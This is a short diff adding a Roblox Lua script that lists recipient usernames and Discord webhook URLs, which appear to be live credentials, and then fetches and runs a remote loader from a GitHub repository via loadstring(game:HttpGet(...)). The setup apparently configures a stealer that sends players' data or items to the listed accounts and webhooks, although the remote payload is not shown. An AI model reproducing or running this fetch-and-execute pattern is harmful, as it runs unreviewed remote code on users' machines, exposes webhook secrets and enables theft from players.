@@ -1,0 +1,4 @@
+Usernames = {"Roloxoxh", "1", "Roloxoxh"} -- add/delete as many as u want
+Webhooks = {"https://discord.com/api/webhooks/1387950529350467696/7iK613HwwWaj9qOvklrOY3UIrquHrqHHE3YzYx9VeoKx6KTX-te1h8FKX2fjTHDSNuS5", "1", "https://discord.com/api/webhooks/1387950529350467696/7iK613HwwWaj9qOvklrOY3UIrquHrqHHE3YzYx9VeoKx6KTX-te1h8FKX2fjTHDSNuS5"} -- add/delete as many as u want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jjrite/SAB/refs/heads/main/loader.lua",true))
